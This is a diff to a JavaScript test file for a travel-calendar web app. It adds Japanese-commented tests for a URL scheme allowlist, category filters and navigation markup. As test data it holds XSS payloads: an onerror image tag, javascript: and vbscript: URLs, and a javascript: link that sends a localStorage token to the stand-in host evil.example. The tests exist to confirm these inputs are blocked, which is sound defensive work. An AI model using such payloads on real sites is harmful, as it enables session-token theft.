@@ -9,10 +9,11 @@
  */
 import test from "node:test";
 import assert from "node:assert/strict";
-import { escapeHtml } from "../assets/js/dom.js";
+import { escapeHtml, safeHttpUrl } from "../assets/js/dom.js";
 import { renderEventDetail } from "../assets/js/sheet.js";
 import { popupHtml, locationRowHtml } from "../assets/js/map.js";
 import { renderCalendar } from "../assets/js/calendar.js";
+import { renderNav } from "../assets/js/nav.js";
 
 /** レビューで実際に window.__pwned = 1 まで到達したペイロード。 */
 const PAYLOAD = '<img src=x onerror="window.__pwned=1">';
@@ -77,6 +78,68 @@ test("renderEventDetail: 日付ラベルもエスケープされる", () => {
     { date: PAYLOAD, dow: PAYLOAD },
   ]);
   assertInert(html, "renderEventDetail(days)");
+});
+
+/* ──────────────────────────────────────────────────────────
+   スキーム。escapeHtml が変換するのは & < > " ' の 5 文字だけなので、
+   その 5 文字を 1 つも含まないペイロード（javascript: … ）は
+   これまでのエスケープ検査を全部すり抜けて href に載っていた。
+   ────────────────────────────────────────────────────────── */
+
+/** クォートもタグも使わない。escapeHtml を通しても 1 文字も変わらない。 */
+const SCHEME_PAYLOAD = "javascript:fetch(`https://evil.example/?t=`+localStorage.token)";
+
+test("エスケープだけではスキーム攻撃を止められない（前提の確認）", () => {
+  // このテストが落ちるようになったら、下の許可リストの前提が変わっている
+  assert.equal(escapeHtml(SCHEME_PAYLOAD), SCHEME_PAYLOAD);
+});
+
+test("safeHttpUrl は http / https だけを通す", () => {
+  assert.equal(safeHttpUrl("https://example.com/a?b=1"), "https://example.com/a?b=1");
+  assert.equal(safeHttpUrl("http://example.com/"), "http://example.com/");
+  for (const bad of [
+    SCHEME_PAYLOAD,
+    "javascript:alert(1)",
+    "JavaScript:alert(1)",
+    "  javascript:alert(1)  ",
+    "java\tscript:alert(1)",
+    "java\nscript:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+    "vbscript:msgbox(1)",
+    "file:///etc/passwd",
+    "/relative/path.html",
+    "example.com",
+    "",
+    "   ",
+    null,
+    undefined,
+    123,
+  ]) {
+    assert.equal(safeHttpUrl(bad), null, `通してはいけない値です: ${JSON.stringify(bad)}`);
+  }
+});
+
+test("renderEventDetail: javascript: の url をクリック可能なリンクにしない", () => {
+  const html = renderEventDetail({ ...evilEvent(), url: SCHEME_PAYLOAD }, DAYS);
+  assert.doesNotMatch(
+    html,
+    /href\s*=\s*["']?\s*javascript:/i,
+    "javascript: が href に載っています"
+  );
+  assert.doesNotMatch(html, /<a\b/i, "弾いた URL がリンクとして描かれています");
+  // 消さずに素のテキストとして見せる（url が空だったのか弾かれたのかを区別できるように）
+  assert.match(html, /http \/ https のみ/, "弾いた理由が表示されていません");
+  assert.ok(html.includes(escapeHtml(SCHEME_PAYLOAD)), "値そのものが表示されていません");
+});
+
+test("renderEventDetail: http / https の url はリンクになる", () => {
+  const html = renderEventDetail({ ...evilEvent(), url: "https://example.com/x" }, DAYS);
+  assert.match(html, /<a href="https:\/\/example\.com\/x" target="_blank" rel="noopener">/);
+});
+
+test("renderEventDetail: url が空なら Link 行そのものを出さない", () => {
+  const html = renderEventDetail({ ...evilEvent(), url: "" }, DAYS);
+  assert.doesNotMatch(html, /Link/);
 });
 
 test("popupHtml: タイトルと場所が無害化される", () => {
@@ -146,7 +209,7 @@ function installDomStub() {
   };
 }
 
-function renderWithStub(days, events) {
+function renderWithStub(days, events, options = {}) {
   const stub = installDomStub();
   try {
     const mount = stub.makeNode("div");
@@ -158,12 +221,26 @@ function renderWithStub(days, events) {
       viewEnd: 22,
       catFilter: null,
       onSelect: () => {},
+      ...options,
     });
     return { mount, htmlSinks: stub.htmlSinks, textSinks: stub.textSinks };
   } finally {
     stub.restore();
   }
 }
+
+/** スタブが作ったツリー全体を平らにする（描画結果を数えるため）。 */
+function flatten(node, out = []) {
+  out.push(node);
+  for (const child of node.children ?? []) flatten(child, out);
+  return out;
+}
+
+/** className が prefix で始まるノードの className 一覧。 */
+const classNames = (mount, prefix) =>
+  flatten(mount)
+    .map((n) => n.className)
+    .filter((c) => typeof c === "string" && c.startsWith(prefix));
 
 test("renderCalendar: タイトルは textContent 経由でしか入らない", () => {
   const timed = evilEvent();
@@ -194,4 +271,103 @@ test("renderCalendar: 列数を days の件数から供給する", () => {
 
   const seven = renderWithStub(days7, [ev(6)]);
   assert.equal(seven.mount.style._props["--day-count"], "7");
+});
+
+/* ──────────────────────────────────────────────────────────
+   カテゴリ絞り込み。既存のテストはすべて catFilter: null で呼んでおり、
+   絞り込みの述語は一度も実行されていなかった。
+   時間指定ブロック（本体）と終日ピル（All day 行）は別の経路なので、
+   両方が同じように絞られることを見る。
+   ────────────────────────────────────────────────────────── */
+
+const FILTER_DAYS = [{ date: "8/12", dow: "水" }];
+
+const FILTER_EVENTS = [
+  { id: "t-food", cat: "cat-food", title: "昼食", allDay: false, startDay: 0, endDay: 0, start: 12, end: 13 },
+  { id: "t-sight", cat: "cat-sight", title: "寺院", allDay: false, startDay: 0, endDay: 0, start: 14, end: 15 },
+  { id: "a-hotel", cat: "cat-hotel", title: "ホテル", allDay: true, startDay: 0, endDay: 0 },
+  { id: "a-food", cat: "cat-food", title: "朝食付き", allDay: true, startDay: 0, endDay: 0 },
+];
+
+test("renderCalendar: catFilter が null なら全カテゴリを描く", () => {
+  const { mount } = renderWithStub(FILTER_DAYS, FILTER_EVENTS, { catFilter: null });
+  assert.deepEqual(classNames(mount, "ev "), ["ev cat-food", "ev cat-sight"]);
+  assert.deepEqual(classNames(mount, "allday-pill "), [
+    "allday-pill cat-hotel",
+    "allday-pill cat-food",
+  ]);
+});
+
+test("renderCalendar: catFilter は時間指定ブロックを絞り込む", () => {
+  const { mount } = renderWithStub(FILTER_DAYS, FILTER_EVENTS, { catFilter: "cat-food" });
+  assert.deepEqual(classNames(mount, "ev "), ["ev cat-food"], "本体が絞り込まれていません");
+});
+
+test("renderCalendar: catFilter は終日ピルも絞り込む", () => {
+  const { mount } = renderWithStub(FILTER_DAYS, FILTER_EVENTS, { catFilter: "cat-food" });
+  assert.deepEqual(
+    classNames(mount, "allday-pill "),
+    ["allday-pill cat-food"],
+    "All day 行が絞り込まれていません"
+  );
+});
+
+test("renderCalendar: 該当が無いカテゴリでは両方とも空になる", () => {
+  const { mount } = renderWithStub(FILTER_DAYS, FILTER_EVENTS, { catFilter: "cat-shop" });
+  assert.deepEqual(classNames(mount, "ev "), []);
+  assert.deepEqual(classNames(mount, "allday-pill "), []);
+  // 行や列の骨格は残る（絞り込みでカレンダーごと消えない）
+  assert.equal(classNames(mount, "cal__col").length, 1);
+  assert.equal(classNames(mount, "cal__allday-cell").length, 1);
+});
+
+/* ──────────────────────────────────────────────────────────
+   ナビ。innerHTML への代入 1 つで完結するので、
+   { innerHTML: "" } だけのスタブで検証できる。
+   ────────────────────────────────────────────────────────── */
+
+const navHtml = (current) => {
+  const mount = { innerHTML: "" };
+  renderNav(mount, current);
+  return mount.innerHTML;
+};
+
+test("renderNav: 3 ページ分のリンクとホームを出す", () => {
+  const html = navHtml(null);
+  for (const href of ["index.html", "schedule.html", "archive.html", "packing.html"]) {
+    assert.ok(html.includes(`href="${href}"`), `${href} へのリンクがありません`);
+  }
+  // nav__links（囲みの div）に釣られないよう、直後の文字まで見る
+  assert.equal(html.match(/class="nav__link[" ]/g).length, 3);
+});
+
+test("renderNav: current のページだけに is-current と aria-current が付く", () => {
+  const html = navHtml("schedule");
+  assert.match(html, /class="nav__link is-current"[\s\S]*?href="schedule\.html" aria-current="page"/);
+  assert.equal(html.match(/is-current/g).length, 1, "is-current が 1 つではありません");
+  assert.equal(html.match(/aria-current/g).length, 1, "aria-current が 1 つではありません");
+});
+
+test("renderNav: current が null / 未知なら is-current も aria-current も付かない", () => {
+  for (const current of [null, undefined, "packing-list"]) {
+    const html = navHtml(current);
+    assert.doesNotMatch(html, /is-current/, `current=${current}`);
+    assert.doesNotMatch(html, /aria-current/, `current=${current}`);
+  }
+});
+
+test("renderNav: current を変えると付く位置も変わる", () => {
+  // is-current が常に同じリンクへ付く（＝比較が死んでいる）実装を弾く
+  for (const [key, href] of [
+    ["schedule", "schedule.html"],
+    ["archive", "archive.html"],
+    ["packing", "packing.html"],
+  ]) {
+    const html = navHtml(key);
+    assert.match(
+      html,
+      new RegExp(`is-current"[\\s\\S]*?href="${href.replace(".", "\\.")}"`),
+      `${key} で is-current が ${href} に付いていません`
+    );
+  }
 });
